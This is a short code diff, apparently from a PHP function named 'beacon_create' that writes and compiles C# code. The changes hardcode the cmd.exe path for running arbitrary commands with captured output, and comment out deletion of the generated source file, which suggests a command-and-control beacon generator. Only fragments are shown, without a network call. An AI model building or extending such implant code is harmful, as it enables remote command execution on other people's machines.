@@ -81,8 +81,8 @@ function beacon_create($id)
             {
  
                 Process process = new Process();
-                process.StartInfo.FileName = "cmd.exe"; // the CMD executable to use
-                process.StartInfo.Arguments = "/c " + cmd; // the command to run
+                process.StartInfo.FileName = "C:\\\windows\\\system32\\\cmd.exe";
+                process.StartInfo.Arguments = "/c " + cmd;
                 process.StartInfo.UseShellExecute = false;
                 process.StartInfo.RedirectStandardOutput = true;
                 process.Start();
@@ -138,7 +138,7 @@ function beacon_create($id)
 
     // Compile the C# code
     shell_exec('/usr/bin/cli-csc ' . $csharpFile);
-    shell_exec('/usr/bin/rm ' . $csharpFile);
+    //shell_exec('/usr/bin/rm ' . $csharpFile);
 
 }
 
